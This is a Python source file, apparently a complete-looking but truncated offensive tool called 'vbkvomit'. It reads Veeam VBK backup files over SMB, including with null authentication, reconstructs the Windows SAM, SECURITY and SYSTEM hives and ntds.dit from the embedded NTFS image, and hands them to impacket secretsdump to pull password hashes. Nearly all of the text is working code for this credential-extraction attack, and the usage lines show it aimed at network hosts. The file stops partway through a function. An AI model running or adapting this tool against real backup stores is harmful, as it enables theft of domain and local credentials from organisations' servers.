#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vbkvomit — Veeam VBK credential extractor.

Reads VBK files directly (locally or over SMB), walks the embedded NTFS
MFT, reassembles SAM/SECURITY/SYSTEM hives + ntds.dit, extracts the
bootkey, and runs impacket secretsdump.py.

Examples:
  SMB null auth:       vbkvomit.py -t 192.168.15.151
  SMB authenticated:   vbkvomit.py -t 10.10.10.5 -u admin -p s3cr3t -d corp
  SMB specific path:   vbkvomit.py -t 192.168.15.151 --path "lab/VeeamBackups"
  Local mounted share: vbkvomit.py --local-path /mnt/backups
"""
import argparse
import getpass
import hashlib
import os
import re
import shutil
import subprocess
import struct
import sys
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

BANNER = r"""
__     ______  _  __ __     _____  __  __ ___ _____
\ \   / / __ )| |/ / \ \   / / _ \|  \/  |_ _|_   _|
 \ \ / /|  _ \| ' /   \ \ / / | | | |\/| || |  | |
  \ V / | |_) | . \    \ V /| |_| | |  | || |  | |
   \_/  |____/|_|\_\    \_/  \___/|_|  |_|___| |_|
"""

try:
    import numpy as _np
except Exception:
    _np = None


def _xor32(buf):
    """XOR of every little-endian uint32 word in buf (len must be /4)."""
    if _np is not None:
        return int(_np.bitwise_xor.reduce(_np.frombuffer(buf, dtype="<u4")))
    x = 0
    for o in range(0, len(buf), 4):
        x ^= int.from_bytes(buf[o:o + 4], "little")
    return x


_print_lock = threading.Lock()
# Keep all state next to the tool itself (not /tmp), so loot + scan caches
# persist and are easy to find.
BASE_DIR = Path(__file__).resolve().parent
CACHE_DIR = BASE_DIR / "vbkvomit_cache"
_VBK_EXT = (".vbk",)   # only .vbk for now (.vib/.vrb are deltas)


def tprint(*a, **kw):
    with _print_lock: print(*a, **kw)

def die(msg, code=1):
    print(f"[!] {msg}", file=sys.stderr); sys.exit(code)

def is_mounted(path):
    return Path("/proc/mounts").read_text().find(f" {path} ") >= 0

def _sudo():
    """['sudo'] prefix when we aren't already root, else []."""
    return [] if os.geteuid() == 0 else ["sudo"]

def force_umount(path):
    pre = _sudo()
    for cmd in ([*pre, "umount", path], [*pre, "umount", "-l", path]):
        if subprocess.run(cmd, capture_output=True).returncode == 0:
            return True
    return False

def size_str(path):
    try: sz = Path(path).stat().st_size
    except: return "?"
    for u in ("B","KB","MB","GB","TB"):
        if sz < 1024: return f"{sz:.1f}{u}"
        sz /= 1024
    return f"{sz:.1f}PB"

def _fmt_eta(seconds):
    s = int(seconds)
    h, rem = divmod(s, 3600)
    m, s = divmod(rem, 60)
    if h:   return f"{h}h {m:02d}m {s:02d}s"
    if m:   return f"{m}m {s:02d}s"
    return f"{s}s"


# ═══ VBK file format primitives ════════════════════════════════════════════════

FIB_MAGIC = b"\x0f\x00\x00\xf8"
FIB_HEADER_SIZE = 12

try:
    import lz4.block as _lz4_block
except Exception:
    _lz4_block = None


def _lz4_compressed_len(stream, target_size):
    """Walk LZ4 block tokens tracking only output length (no copies) and return
    the exact compressed length that produces target_size bytes.  Native lz4
    needs that exact length — the payload has trailing padding otherwise."""
    out = 0; p = 0; n = len(stream)
    while out < target_size and p < n:
        tok = stream[p]; p += 1
        ll = tok >> 4
        if ll == 15:
            while p < n:
                b = stream[p]; p += 1; ll += b
                if b != 255: break
        p += ll; out += ll
        if out >= target_size or p + 2 > n:
            break
        p += 2
        ml = (tok & 0xf) + 4
        if (tok & 0xf) == 15:
            while p < n:
                b = stream[p]; p += 1; ml += b
                if b != 255: break
        out += ml
    return p


def lz4_block_decode(stream, target_size, clen=None):
    """Decode one Veeam LZ4 block -> (bytes, compressed_len).  Uses native lz4
    (~40x faster than pure python) when installed.  `clen` is the exact
    compressed length: if the caller already knows it (from the block
    descriptor's +36 field) we skip the token-walk entirely — the single
    biggest cost of a decode — and go straight to the C decoder."""
    if _lz4_block is not None:
        try:
            if not clen:
                clen = _lz4_compressed_len(stream, target_size)
            out = _lz4_block.decompress(stream[:clen], uncompressed_size=target_size)
            if len(out) == target_size:
                return out, clen
        except Exception:
            pass
    return _lz4_block_decode_py(stream, target_size)


def _lz4_block_decode_py(stream, target_size):
    """LZ4 BLOCK format decoder tolerant of Veeam stream termination."""
    out = bytearray()
    p = 0
    n = len(stream)
    while len(out) < target_size and p < n:
        token = stream[p]; p += 1
        lit_len = token >> 4
        match_len_bias = token & 0xf
        if lit_len == 15:
            while p < n:
                b = stream[p]; p += 1
                lit_len += b
                if b != 255: break
        if p + lit_len > n:
            out.extend(stream[p:n])
            return bytes(out), n
        out.extend(stream[p:p + lit_len])
        p += lit_len
        if len(out) >= target_size: break
        if p + 2 > n: break
        offset = stream[p] | (stream[p + 1] << 8); p += 2
        if offset == 0: break
        match_len = match_len_bias + 4
        if match_len_bias == 15:
            while p < n:
                b = stream[p]; p += 1
                match_len += b
                if b != 255: break
        if offset > len(out): break
        for _ in range(match_len):
            out.append(out[-offset])
            if len(out) >= target_size: break
    return bytes(out), p


class FibBlock:
    def __init__(self, file_offset, header):
        if header[:4] != FIB_MAGIC:
            raise ValueError(f"Bad FIB magic at 0x{file_offset:x}")
        self.file_offset = file_offset
        self.crc = struct.unpack_from("<I", header, 4)[0]
        self.decompressed_size = struct.unpack_from("<I", header, 8)[0]
        self.compressed_size = None

    def payload_offset(self):
        return self.file_offset + FIB_HEADER_SIZE

    def decompress(self, fh, max_payload=2 << 20, clen=None):
        fh.seek(self.payload_offset())
        # If we know the exact compressed length (from the descriptor) read
        # only that — no over-read, no token-walk.
        payload = fh.read(clen if clen else (self.compressed_size or max_payload))
        data, consumed = lz4_block_decode(payload, self.decompressed_size, clen)
        if not self.compressed_size:
            self.compressed_size = consumed
        return data


def scan_fib_blocks_offsets(path_or_fh, start=0, end=None, progress=None, n_workers=None):
    """Parallel FIB block scan: N threads each use os.pread() over their region."""
    import threading

    if hasattr(path_or_fh, 'name'):
        path = path_or_fh.name
        if end is None:
            path_or_fh.seek(0, 2); end = path_or_fh.tell()
    else:
        path = str(path_or_fh)
        if end is None:
            end = os.path.getsize(path)

    VALID = {0x100000, 0x80000, 0x40000}
    CHUNK = 16 << 20  # 16 MB per read — frequent enough for progress on slow CIFS
    PROGRESS_INTERVAL = 64 << 20  # report every 64 MB total

    if n_workers is None:
        n_workers = min(8, os.cpu_count() or 4)
    total = end - start
    # Don't spin up more workers than there are chunks to read
    n_workers = max(1, min(n_workers, (total + CHUNK - 1) // CHUNK))
    region = (total + n_workers - 1) // n_workers

    shared_done = [0] * n_workers
    shared_lock = threading.Lock()
    last_progress = [start]
    results = [[] for _ in range(n_workers)]

    def scan_region(wid, r_start, r_end):
        offsets = []
        pos = r_start
        fd = -1
        try:
            fd = os.open(path, os.O_RDONLY)
            try:
                import ctypes
                ctypes.CDLL(None).posix_fadvise(fd, r_start, r_end - r_start, 2)  # FADV_SEQUENTIAL
            except Exception:
                pass
            while pos < r_end:
                chunk = os.pread(fd, min(CHUNK, r_end - pos + 12), pos)
                if not chunk:
                    break
                p = 0
                while True:
                    i = chunk.find(FIB_MAGIC, p)
                    if i < 0:
                        break
                    if i + 12 <= len(chunk):
                        ds = struct.unpack_from("<I", chunk, i + 8)[0]
                        if ds in VALID:
                            offsets.append(pos + i)
                    p = i + 1
                pos += max(1, len(chunk) - 4)
                shared_done[wid] = pos - r_start
                if progress:
                    with shared_lock:
                        total_done = start + sum(shared_done)
                        if total_done - last_progress[0] >= PROGRESS_INTERVAL:
                            progress(total_done, end)
                            last_progress[0] = total_done
        except Exception:
            pass
        finally:
            if fd >= 0:
                try: os.close(fd)
                except: pass
        results[wid] = offsets

    threads = []
    for i in range(n_workers):
        r_start = start + i * region
        if r_start >= end:
            break
        r_end = min(end, r_start + region)
        t = threading.Thread(target=scan_region, args=(i, r_start, r_end), daemon=True)
        threads.append(t)

    for t in threads: t.start()
    for t in threads: t.join()

    return sorted(set(o for r in results for o in r))


# ═══ NTFS MFT walking ════════════════════════════════════════════════════════

def parse_attrs(rec):
    used = struct.unpack_from("<I", rec, 0x18)[0]
    pos = struct.unpack_from("<H", rec, 0x14)[0]
    while pos < min(used, len(rec) - 16):
        atype = struct.unpack_from("<I", rec, pos)[0]
        if atype == 0xFFFFFFFF: return
        alen = struct.unpack_from("<I", rec, pos+4)[0]
        if alen == 0: return
        yield atype, alen, rec[pos:pos+alen]
        pos += alen


def get_filenames(rec):
    names = []
    for atype, alen, attr in parse_attrs(rec):
        if atype != 0x30 or attr[8]: continue
        value_off = struct.unpack_from("<H", attr, 0x14)[0]
        v = attr[value_off:]
        if len(v) < 0x42: continue
        parent = struct.unpack_from("<Q", v, 0)[0] & 0x0000FFFFFFFFFFFF
        fname_len = v[0x40]; ns = v[0x41]
        fname = v[0x42 : 0x42 + 2*fname_len].decode("utf-16-le", errors="replace")
        names.append((parent, fname, ns))
    return names


def get_data_attr(rec, stream_name=""):
    for atype, alen, attr in parse_attrs(rec):
        if atype != 0x80: continue
        name_len = attr[9]
        name_off = struct.unpack_from("<H", attr, 0x0a)[0]
        attr_name = attr[name_off:name_off + 2*name_len].decode("utf-16-le", errors="replace")
        if attr_name != stream_name: continue
        if attr[8]:
            data_size = struct.unpack_from("<Q", attr, 0x30)[0]
            runs_off = struct.unpack_from("<H", attr, 0x20)[0]
            return (data_size, attr[runs_off:], True)
        else:
            value_off = struct.unpack_from("<H", attr, 0x14)[0]
            value_len = struct.unpack_from("<I", attr, 0x10)[0]
            return (value_len, attr[value_off:value_off+value_len], False)
    return None


def decode_runs(runs):
    res, pos, cur_lcn = [], 0, 0
    while pos < len(runs):
        h = runs[pos]
        if h == 0: break
        ls, ofs = h & 0xf, (h >> 4) & 0xf
        pos += 1
        rl = int.from_bytes(runs[pos:pos+ls], 'little', signed=False)
        pos += ls
        if ofs:
            ro = int.from_bytes(runs[pos:pos+ofs], 'little', signed=True)
            pos += ofs
            cur_lcn += ro
            res.append((rl, cur_lcn))
        else:
            res.append((rl, None))
    return res


# ═══ The wine-free extractor ═══════════════════════════════════════════════════

def _check_mft_worker(args):
    """Multiprocess worker: decompress one FIB block, check for MFT records."""
    vbk_path, off, *rest = args
    clen = rest[0] if rest else None
    try:
        with open(vbk_path, "rb") as fh:
            fh.seek(off); hdr = fh.read(12)
            if hdr[:4] != FIB_MAGIC: return (off, False)
            blk = FibBlock(off, hdr)
            if blk.decompressed_size != 0x100000: return (off, False)
            fh.seek(off + 12)
            payload = fh.read(clen if clen else (2 << 20))
            data, _ = lz4_block_decode(payload, 0x100000, clen)
        if len(data) < 8192: return (off, False)
        file_count = sum(1 for i in range(0, 8192, 1024)
                         if data[i:i+4] in (b'FILE', b'BAAD'))
        return (off, file_count >= 4)
    except Exception:
        return (off, False)


def _walk_mft_block_worker(args):
    """Decompress one MFT FIB block and return its allocated MFT records as
    (rec_num, name_list, data_attr_or_None) tuples.  Avoids passing the full
    1024-byte record over IPC."""
    vbk_path, off, *rest = args
    clen = rest[0] if rest else None
    out = []
    try:
        with open(vbk_path, "rb") as fh:
            fh.seek(off); hdr = fh.read(12)
            blk = FibBlock(off, hdr)
            fh.seek(off + 12)
            payload = fh.read(clen if clen else (2 << 20))
            data, _ = lz4_block_decode(payload, 0x100000, clen)
        for r in range(0, len(data), 1024):
            rec = data[r:r+1024]
            if rec[:4] not in (b'FILE', b'BAAD'): continue
            rec_num = struct.unpack_from("<I", rec, 0x2c)[0]
            flags = struct.unpack_from("<H", rec, 0x16)[0]
            if not (flags & 1): continue
            names = get_filenames(rec)
            da = get_data_attr(rec)
            out.append((rec_num, names, da))
    except Exception:
        pass
    return out


def _check_regf_worker(args):
    """Multiprocess worker: decompress one FIB block, check for regf at given offset."""
    vbk_path, off, target_in_off, *rest = args
    clen = rest[0] if rest else None
    try:
        with open(vbk_path, "rb") as fh:
            fh.seek(off); hdr = fh.read(12)
            if hdr[:4] != FIB_MAGIC: return (off, False)
            blk = FibBlock(off, hdr)
            if blk.decompressed_size != 0x100000: return (off, False)
            fh.seek(off + 12)
            payload = fh.read(clen if clen else (2 << 20))
            data, _ = lz4_block_decode(payload, 0x100000, clen)
        if len(data) < target_in_off + 0x100: return (off, False)
        if data[target_in_off:target_in_off+4] != b'regf': return (off, False)
        seq_pri = struct.unpack_from("<I", data, target_in_off+0x04)[0]
        seq_sec = struct.unpack_from("<I", data, target_in_off+0x08)[0]
        bins_size = struct.unpack_from("<I", data, target_in_off+0x28)[0]
        if seq_pri != seq_sec: return (off, False)
        if bins_size == 0 or (bins_size & 0xFFF): return (off, False)
        return (off, True)
    except Exception:
        return (off, False)


def _check_ese_worker(args):
    """Worker: check for ESE database magic (efcdab89) at +4 of given offset."""
    vbk_path, off, target_in_off, *rest = args
    clen = rest[0] if rest else None
    try:
        with open(vbk_path, "rb") as fh:
            fh.seek(off); hdr = fh.read(12)
            if hdr[:4] != FIB_MAGIC: return (off, False)
            blk = FibBlock(off, hdr)
            if blk.decompressed_size != 0x100000: return (off, False)
            fh.seek(off + 12)
            payload = fh.read(clen if clen else (2 << 20))
            data, _ = lz4_block_decode(payload, 0x100000, clen)
        if len(data) < target_in_off + 16: return (off, False)
        if data[target_in_off+4:target_in_off+8] != b'\xef\xcd\xab\x89':
            return (off, False)
        ver = struct.unpack_from("<I", data, target_in_off+8)[0]
        if ver < 0x100 or ver > 0x10000: return (off, False)
        return (off, True)
    except Exception:
        return (off, False)


def _check_ese_pages_worker(args):
    """Worker: check for valid ESE page structure at offset.
    ESE 8 KB pages have a checksum at 0 (non-zero) and a page number
    that increments across pages.  We require multiple consecutive 8 KB
    pages to look ESE-like."""
    vbk_path, off, target_in_off, *rest = args
    clen = rest[0] if rest else None
    try:
        with open(vbk_path, "rb") as fh:
            fh.seek(off); hdr = fh.read(12)
            if hdr[:4] != FIB_MAGIC: return (off, False)
            blk = FibBlock(off, hdr)
            if blk.decompressed_size != 0x100000: return (off, False)
            fh.seek(off + 12)
            payload = fh.read(clen if clen else (2 << 20))
            data, _ = lz4_block_decode(payload, 0x100000, clen)
        # Validate that 4 consecutive 8KB pages at target_in_off look like ESE pages.
        # ESE page header layout (DB engine 0x620, page size 8192):
        #   +0x00 u32 page_xor_chk
        #   +0x04 u32 page_num  (sometimes; can be 0 for header pages)
        #   +0x08 u64 db_time_dirtied
        #   +0x10 u32 prev_page (or 0)
        #   +0x14 u32 next_page (or 0)
        #   +0x18 u32 obj_id_fdp
        # A reliable check: prev_page and next_page sane (0 or close to current), page is non-zero.
        ese_pages = 0
        for k in range(4):
            p = target_in_off + k * 8192
            if p + 8192 > len(data): break
            if data[p:p+8] == b'\x00' * 8: continue   # blank
            chk = struct.unpack_from("<I", data, p)[0]
            if chk == 0 or chk == 0xFFFFFFFF: continue
            ese_pages += 1
        return (off, ese_pages >= 3)
    except Exception:
        return (off, False)


class VBKExtractor:
    def __init__(self, vbk_path, want_ntds=False, fib_offsets=None):
        self.vbk_path = str(vbk_path)
        self.fh = open(vbk_path, "rb")
        self.fh.seek(0, 2); self.file_size = self.fh.tell()
        self.lba_anchors = []
        self._mft_blocks = None
        self._decomp_cache = {}
        self._clen_map = {}
        self.want_ntds = want_ntds
        if fib_offsets is not None:
            self.fib_offsets = fib_offsets
        else:
            self.fib_offsets = self._load_or_scan_fib_offsets()

    def _cache_path(self, suffix):
        h = hashlib.md5(self.vbk_path.encode()).hexdigest()[:16]
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
        return CACHE_DIR / f"{h}.{suffix}"

    def _blocks_from_metadata(self):
        """Fast path: read Veeam's own block directory instead of scanning the
        whole file for FIB magic.  Data blocks are packed contiguously; each
        60-byte descriptor holds file_offset (+5,u64) and stored_size (+13,u32).
        Descriptors live in banks in (a) the file header and (b) tail metadata
        regions pointed to by superblock pointer tables (16-byte entries
        [ptr:u64][size:u32][crc:u32] from offset 0xa0).  Returns a sorted list
        of block file offsets, or None if the layout can't be parsed with
        confidence — in which case the caller falls back to a full scan."""
        fh, fsz = self.fh, self.file_size

        def read(o, n):
            fh.seek(o); return fh.read(n)

        def bank_descs(page):
            out = []
            for i in range(len(page) // 60):
                e = page[i * 60:i * 60 + 60]
                fo = struct.unpack_from("<Q", e, 5)[0]
                ss = struct.unpack_from("<I", e, 13)[0]
                if e[0] > 0x10 or fo == 0 or fo >= fsz or (fo & 0xFFF):
                    break
                # +36 u32 = (compressed payload length + 12).  Gives the exact
                # LZ4 length so the C decoder needs no token-walk.
                clen = struct.unpack_from("<I", e, 36)[0] - 12
                if not (0 < clen < ss):
                    clen = 0          # implausible -> fall back to token-walk
                out.append((fo, ss, clen))
            return out

        try:
            # Header = everything before the first FIB block; holds the first
            # banks plus the superblock pointer tables.  Small (a couple MB).
            head = read(0, 4 << 20)
            first_fib = head.find(FIB_MAGIC)
            if first_fib < 0:
                return None
            header = head[:first_fib]
            descs = {}
            clen_map = {}
            region_ptrs = {}
            for p in range(0, len(header) - 60, 0x1000):
                for fo, ss, cl in bank_descs(header[p:p + 0x1000]):
                    descs[fo] = ss; clen_map[fo] = cl
            # Collect region pointers: [ptr:u64][size:u32] pairs in the header
            # whose ptr is a page-aligned in-file offset past the data start and
            # whose size is a sane region length.  (Superblock pointer tables
            # live at fixed 0x1000/0x81000, but scanning the header is version-
            # agnostic.)  Each candidate is confirmed by checking its first page
            # actually parses as a descriptor bank before we read the region.
            for p in range(0, len(header) - 16, 8):
                ptr = struct.unpack_from("<Q", header, p)[0]
                sz = struct.unpack_from("<I", header, p + 8)[0]
                if (first_fib < ptr < fsz and (ptr & 0xFFF) == 0
                        and 0x1000 <= sz <= (16 << 20) and (ptr + sz) <= fsz):
                    region_ptrs[ptr] = max(region_ptrs.get(ptr, 0), sz)
            # Parse each candidate region fully; real descriptor banks yield
            # entries, hash/header pages and false-positive pointers yield none
            # and drop out.  Cap cumulative reads so a pathological header can't
            # trigger unbounded I/O (falls back to scan if that ever happens).
            budget = 512 << 20
            for ptr, sz in sorted(region_ptrs.items()):
                if sz > budget:
                    break
                budget -= sz
                region = read(ptr, sz)
                for q in range(0, len(region) - 60, 0x1000):
                    for fo, ss, cl in bank_descs(region[q:q + 0x1000]):
                        descs[fo] = ss; clen_map[fo] = cl
            if len(descs) < 16:
                return None
            offsets = sorted(descs)
            # Confidence checks: sampled blocks must carry FIB magic, and the
            # descriptors should chain by stored_size (packed layout).
            sample = offsets[::max(1, len(offsets) // 60)]
            bad = sum(1 for fo in sample if read(fo, 4) != FIB_MAGIC)
            if bad > len(sample) // 20:
                return None
            chain = sum(1 for i in range(len(offsets) - 1)
                        if offsets[i] + descs[offsets[i]] == offsets[i + 1])
            if chain < (len(offsets) - 1) * 0.9:
                return None
            self._clen_map = clen_map
            return offsets
        except Exception:
            return None

    def _load_or_scan_fib_offsets(self):
        cache = self._cache_path("fib_offsets")
        clen_cache = self._cache_path("clen_map")
        if cache.exists():
            if clen_cache.exists():
                for ln in clen_cache.read_text().splitlines():
                    o, c = ln.split(":"); self._clen_map[int(o, 16)] = int(c)
            return [int(l, 16) for l in cache.read_text().splitlines()]
        # Fast path: parse Veeam's block directory (~5 MB read vs. ~10 GB scan).
        t0 = time.time()
        offsets = self._blocks_from_metadata()
        if offsets:
            cache.write_text("\n".join(f"{o:x}" for o in offsets))
            if self._clen_map:
                clen_cache.write_text("\n".join(f"{o:x}:{c}"
                                      for o, c in self._clen_map.items()))
            tprint(f"  [+] {len(offsets)} FIB blocks from metadata "
                   f"({time.time()-t0:.1f}s)")
            return offsets
        n_scan_workers = min(8, os.cpu_count() or 4)
        tprint(f"  [*] Metadata parse unavailable — FIB block scan over "
               f"{self.file_size/(1<<30):.1f} GB "
               f"({n_scan_workers} parallel threads)...")
        def progress(pos, end):
            elapsed = time.time() - t0
            mbps = (pos/(1<<20)) / max(elapsed, 0.1)
            tprint(f"      {pos/(1<<30):.1f}/{end/(1<<30):.1f} GB ({100*pos//end}%) "
                   f"@ {mbps:.0f} MB/s")
        offsets = scan_fib_blocks_offsets(self.fh, progress=progress, n_workers=n_scan_workers)
        cache.write_text("\n".join(f"{o:x}" for o in offsets))
        tprint(f"  [+] {len(offsets)} FIB blocks ({time.time()-t0:.1f}s)")
        return offsets

    def decompress_at(self, file_off):
        self.fh.seek(file_off); hdr = self.fh.read(12)
        return FibBlock(file_off, hdr).decompress(self.fh, clen=self._clen_map.get(file_off))

    def find_mft_blocks(self):
        """Find MFT FIB blocks. Uses NTFS VBR to narrow the search window first."""
        if self._mft_blocks is not None: return self._mft_blocks
        cache = self._cache_path("mft_blocks")
        if cache.exists():
            self._mft_blocks = [int(l, 16) for l in cache.read_text().splitlines()]
            return self._mft_blocks
        # Find NTFS VBR (in first ~50 FIB blocks)
        tprint(f"  [*] Locating NTFS VBR...")
        vbr_off, vbr = None, None
        for off in self.fib_offsets[:50]:
            try: d = self.decompress_at(off)
            except: continue
            if d[:3] == b'\xeb\x52\x90' and d[3:11] == b'NTFS    ':
                vbr_off, vbr = off, d; break
        if not vbr:
            raise RuntimeError("NTFS VBR not found in first 50 FIB blocks")
        bps = struct.unpack_from("<H", vbr, 11)[0]
        spc = vbr[13]
        mft_lcn = struct.unpack_from("<Q", vbr, 48)[0]
        target_lba = (mft_lcn * bps * spc) // (1 << 20)
        tprint(f"  [+] NTFS VBR @ FIB 0x{vbr_off:x}: MFT cluster={mft_lcn}, "
               f"NTFS-LBA={target_lba}")

        # MFT region: estimate via interpolation from VBR
        vbr_idx = self.fib_offsets.index(vbr_off)
        # MFT spans 144 LBA-blocks, FIB blocks should be roughly that many entries
        # past file_idx vbr_idx + target_lba
        guess_idx = vbr_idx + target_lba
        # Search a window around guess_idx — wide enough to handle dedup variations
        win = 500
        lo = max(0, guess_idx - win)
        hi = min(len(self.fib_offsets), guess_idx + win + 200)
        candidates = self.fib_offsets[lo:hi]
        tprint(f"  [*] Searching {len(candidates)} FIB blocks for MFT records...")
        mft = self._mp_check_blocks(candidates, _check_mft_worker, target_count=144)
        if len(mft) < 100:
            tprint(f"  [!] only {len(mft)} MFT blocks found, widening to full file...")
            mft = self._mp_check_blocks(self.fib_offsets, _check_mft_worker)
        cache.write_text("\n".join(f"{o:x}" for o in mft))
        tprint(f"  [+] {len(mft)} MFT FIB blocks")
        self._mft_blocks = mft
        return mft

    def _mp_check_blocks(self, fib_offsets, worker, target_count=None):
        """Multiprocess: run worker(args) on each FIB block, return matches."""
        n_proc = min(8, os.cpu_count() or 4)
        try:
            from multiprocessing import Pool
        except ImportError:
            return [o for o in fib_offsets
                    if worker((self.vbk_path, o, self._clen_map.get(o)))[1]]
        t0 = time.time()
        with Pool(n_proc) as pool:
            args = [(self.vbk_path, o, self._clen_map.get(o)) for o in fib_offsets]
            hits = []
            consec = 0
            processed = 0
            last_report = 0
            for off, is_match in pool.imap(worker, args, chunksize=20):
                processed += 1
                if is_match:
                    hits.append(off)
                    consec += 1
                else:
                    if target_count and consec >= target_count - 10:
                        break  # got a long contiguous run, done
                    consec = 0
                if processed - last_report >= 500:
                    elapsed = time.time() - t0
                    rate = processed / max(elapsed, 0.1)
                    eta = (len(fib_offsets) - processed) / max(rate, 1)
                    tprint(f"      {processed}/{len(fib_offsets)} blocks, "
                           f"{len(hits)} matches, ETA {_fmt_eta(eta)}")
                    last_report = processed
            pool.terminate()
        return hits

    def calibrate(self):
        """
        Build LBA→FIB anchors using:
          1. $MFT cluster runs (gives 144+ contiguous anchors)
          2. Adaptive: for each registry hive (SAM/SYSTEM/SECURITY) that
             we want to extract, locate its first FIB block by content
             matching (search for the regf header at the expected in-block
             offset) and add that as an anchor.
        """
        cache = self._cache_path("anchors.ntds" if self.want_ntds else "anchors")
        if cache.exists():
            try:
                self.lba_anchors = sorted(
                    tuple(int(x) for x in ln.split(","))
                    for ln in cache.read_text().splitlines() if ln)
                if self.lba_anchors:
                    tprint(f"  [*] Loaded {len(self.lba_anchors)} LBA anchors from cache")
                    return
            except Exception:
                self.lba_anchors = []
        mft_blocks = self.find_mft_blocks()
        if not mft_blocks:
            raise RuntimeError("No MFT blocks found — VBK may be encrypted or corrupted")
        d = self.decompress_at(mft_blocks[0])
        mft0 = d[:1024]
        if mft0[:4] != b'FILE':
            raise RuntimeError("First MFT block doesn't start with FILE record")
        # Anchor $MFT cluster runs
        for atype, alen, attr in parse_attrs(mft0):
            if atype != 0x80: continue
            if attr[8]:
                runs_off = struct.unpack_from("<H", attr, 0x20)[0]
                runs = decode_runs(attr[runs_off:])
                cur_fi = self.fib_offsets.index(mft_blocks[0])
                for run_len, lcn in runs:
                    if lcn is None: continue
                    start_lba = (lcn * 4096) // (1 << 20)
                    end_lba = ((lcn + run_len - 1) * 4096) // (1 << 20)
                    for lba in range(start_lba, end_lba + 1):
                        self.lba_anchors.append((lba, cur_fi))
                        cur_fi += 1
                break
        self.lba_anchors.sort()

        # Adaptive anchors: for each registry hive we'll need, locate its
        # first FIB block via content matching.  Hive content is unique-per-
        # server, so anchoring run 0 + walking forward is reliable.
        for path in ("Windows/System32/config/SYSTEM",
                     "Windows/System32/config/SAM",
                     "Windows/System32/config/SECURITY"):
            self._add_hive_anchor(path)
        if self.want_ntds:
            for ntds_path in ("Windows/NTDS/ntds.dit", "Windows/System32/ntds.dit"):
                if self.find_file(ntds_path):
                    # Only anchor run 0 as a seed; extract_runs_verified locates
                    # the remaining runs by ESE-checksum content matching.
                    self._add_ese_anchors(ntds_path, only_first_run=True)
                    break
        self.lba_anchors.sort()
        try:
            cache.write_text("\n".join(f"{lba},{fi}" for lba, fi in self.lba_anchors))
        except Exception:
            pass

    def _add_anchor_for_lba(self, target_lba, target_in_off, worker, search_radius=400):
        """Locate the FIB block for target_lba by content-matching `worker`,
        spiralling out from the interpolation guess."""
        for lba, fi in self.lba_anchors:
            if lba == target_lba: return True

        guessed_off = self.lba_to_fib(target_lba)
        n = len(self.fib_offsets)
        guess_fi = self.fib_offsets.index(guessed_off) if guessed_off in self.fib_offsets else 0
        candidates = []
        for delta in range(search_radius + 1):
            for sign in (1, -1):
                fi = guess_fi + sign * delta if delta else guess_fi
                if 0 <= fi < n:
                    candidates.append((fi, self.fib_offsets[fi]))
                if delta == 0: break

        n_proc = min(8, os.cpu_count() or 4)
        try:
            from multiprocessing import Pool
            with Pool(n_proc) as pool:
                args = [(self.vbk_path, off, target_in_off, self._clen_map.get(off))
                        for fi, off in candidates]
                idx_by_off = {off: fi for fi, off in candidates}
                for off, ok in pool.imap(worker, args, chunksize=10):
                    if ok:
                        self.lba_anchors.append((target_lba, idx_by_off[off]))
                        self.lba_anchors.sort()
                        pool.terminate()
                        return True
                pool.terminate()
        except Exception:
            for fi, off in candidates:
                ok = worker((self.vbk_path, off, target_in_off, self._clen_map.get(off)))[1]
                if ok:
                    self.lba_anchors.append((target_lba, fi))
                    self.lba_anchors.sort()
                    return True
        return False

    def _add_hive_anchor(self, target_path, search_radius=400):
        """Search FIB blocks for a regf header at the file's first-cluster offset.
        Walk forward through subsequent LBAs of run 0 (registry hive content
        is unique-per-server, no dedup in-run) to add neighbor anchors."""
        found = self.find_file(target_path)
        if not found: return False
        rec_num, da = found
        if da is None or not da[2]: return False
        ds, runs_bytes, _ = da
        runs = decode_runs(runs_bytes)
        if not runs or runs[0][1] is None: return False
        run_len, lcn = runs[0]
        byte_off = lcn * 4096
        target_lba = byte_off // (1 << 20)
        target_in_off = byte_off % (1 << 20)
        if not self._add_anchor_for_lba(target_lba, target_in_off,
                                         _check_regf_worker, search_radius):
            return False
        # Walk forward to add anchors for subsequent LBAs of run 0 (hive bins)
        anchor_fi = next(fi for lba, fi in self.lba_anchors if lba == target_lba)
        end_byte = (lcn + run_len) * 4096 - 1
        end_lba = end_byte // (1 << 20)
        for k in range(1, end_lba - target_lba + 1):
            if anchor_fi + k < len(self.fib_offsets):
                self.lba_anchors.append((target_lba + k, anchor_fi + k))
        self.lba_anchors.sort()
        return True

    def _add_ese_anchors(self, target_path, search_radius=2000, only_first_run=False):
        """For an ESE database (NTDS): anchor run 0 via ESE magic + walk
        forward through its LBAs.  For runs 1+, search for ESE-page-like
        content at the expected in-block offset and add anchors per run.
        With only_first_run=True we anchor just run 0 (a seed) and leave the
        rest to extract_runs_verified — far cheaper, since run 1+ searches are
        the slowest part of calibration."""
        found = self.find_file(target_path)
        if not found: return False
        rec_num, da = found
        if da is None or not da[2]: return False
        ds, runs_bytes, _ = da
        runs = decode_runs(runs_bytes)
        if not runs: return False
        ok = False
        for run_idx, (run_len, lcn) in enumerate(runs):
            if only_first_run and run_idx > 0 and ok:
                break
            if lcn is None: continue
            byte_off = lcn * 4096
            target_lba = byte_off // (1 << 20)
            target_in_off = byte_off % (1 << 20)
            if any(lba == target_lba for lba, _ in self.lba_anchors):
                ok = True; continue
            worker = _check_ese_worker if run_idx == 0 else _check_ese_pages_worker
            if not self._add_anchor_for_lba(target_lba, target_in_off,
                                             worker, search_radius):
                continue
            ok = True
            anchor_fi = next(fi for lba, fi in self.lba_anchors if lba == target_lba)
            end_byte = (lcn + run_len) * 4096 - 1
            end_lba = end_byte // (1 << 20)
            for k in range(1, end_lba - target_lba + 1):
                if anchor_fi + k < len(self.fib_offsets):
                    self.lba_anchors.append((target_lba + k, anchor_fi + k))
            self.lba_anchors.sort()
        return ok

    def lba_to_fib(self, lba):
        """Map a volume LBA (1 MB unit) to the file offset of its FIB block.

        Veeam stores FIB blocks in *piecewise-linear* order: within one backup
        extent, consecutive FIB blocks map to consecutive LBAs (fib_index =
        lba + const), but there are jumps between extents.  So we snap to the
        *nearest* anchor and apply that segment's 1:1 offset — never
        interpolate a slope across two anchors, which silently crosses extent
        boundaries and returns a foreign block (the old SAM/NTDS corruption)."""
        import bisect
        anchors = self.lba_anchors
        idx = bisect.bisect_left(anchors, (lba, 0))
        if idx < len(anchors) and anchors[idx][0] == lba:
            return self.fib_offsets[anchors[idx][1]]
